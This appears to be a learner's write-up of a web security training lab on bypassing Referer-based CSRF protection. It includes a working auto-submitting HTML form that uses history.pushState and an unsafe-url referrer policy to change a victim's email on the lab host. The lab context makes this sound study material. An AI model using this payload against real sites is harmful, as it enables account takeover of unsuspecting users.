# Practitioner Lab 87: CSRF with broken Referer validation

---

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials:Â `wiener:peter`

![Untitled](Practitioner%20Lab%2087%20CSRF%20with%20broken%20Referer%20valid%204ceb0554c0a442aa8f08e487ac8451a7/Untitled.png)

When I try to send a normal payload it gives me the error saying that I require valid referer header 

Now I know that I must see how it works. 

Sometimes if the referer header is ommited then the validation is also ommited. 

This did not work in this case meaning that I must change my payload somehow to include the referer. 

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5400700454ae25826e66db00160040.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test" />
      <input type="submit" value="Submit request" />
    </form>
<meta name="referrer" content="unsafe-url">
    <script>
      history.pushState('', '', '/?0a5400700454ae25826e66db00160040.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

I added the referer url to the history.pushState this allowed me to change the referer. 

I had to also change the policy for the referrer to unsafe-url.

![Untitled](Practitioner%20Lab%2087%20CSRF%20with%20broken%20Referer%20valid%204ceb0554c0a442aa8f08e487ac8451a7/Untitled%201.png)